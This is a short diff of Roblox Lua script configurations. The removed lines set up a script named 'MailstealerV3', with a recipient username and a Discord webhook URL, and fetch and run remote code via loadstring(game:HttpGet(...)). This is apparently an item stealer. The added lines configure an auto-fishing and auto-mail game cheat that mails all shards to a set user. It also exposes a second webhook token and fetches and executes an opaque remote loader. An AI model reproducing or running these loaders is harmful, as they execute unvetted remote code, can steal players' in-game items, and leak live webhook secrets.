@@ -1,7 +1,19 @@
-Username = "frunzaiosuge"
-Webhook = "https://discord.com/api/webhooks/1193653558860587018/2_USxC0I2e9BqzHX0AdNk3cIRCARf-bjiHt22F6Me_1hZJWG8O-VVtUzD2SQBa3i-oxE"
-
-LoadingScreen = true
-MinimumRAP = 10000
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/MailstealerV3/main/main"))()
+getgenv().config = {
+    autoFishing = true, -- true / false 
+    placetoFish = "AdvancedFishing", -- "Fishing" // "AdvancedFishing"
+    invisWater = true, -- make area's water transparent
+    
+    userToMail = "bobofarm106", -- your main's username to mail all Magic Shards to
+    amountToMail = 0, -- amount to mail if set to 0 then it sends all
+    autoMail = true, -- true / false for below option
+    mailTime = "300", -- how often to send mail (seconds)
+    
+    --collectMail = false, -- PLANNED FEATURE NOT YET
+    --collectTime = "300", -- PLANNED FEATURE NOT YET
+    
+    autoPresents = true, -- true / false (collects presents on 5 min timer)
+    
+     sendWebhooks = true, -- waiting for executor that supports http
+     webhookUrl = "https://discord.com/api/webhooks/1072980630616424550/ZNOKsN__H2C2-ITfQOnJMUtJDddKlPzs3l3LhBoE6QYqhAi8XFkxJS4MilJE5x03QuKo"
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2ba71da818277b618eace56f899d9d3e.lua"))()
